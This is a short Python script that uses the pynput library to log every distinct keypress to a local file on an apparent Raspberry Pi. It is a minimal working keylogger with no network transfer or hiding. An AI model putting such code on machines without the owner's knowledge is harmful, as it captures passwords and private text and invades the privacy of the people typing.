from pynput.keyboard import Listener
ultima = None
def log(key):

    global ultima
    if key != ultima:
        ultima = key
        with open("/home/kurk/logs_do_raspberry_pi", "a" ) as f:
            f.write (str(key) + "\n")
with Listener(on_press=log) as l:
    l.join()
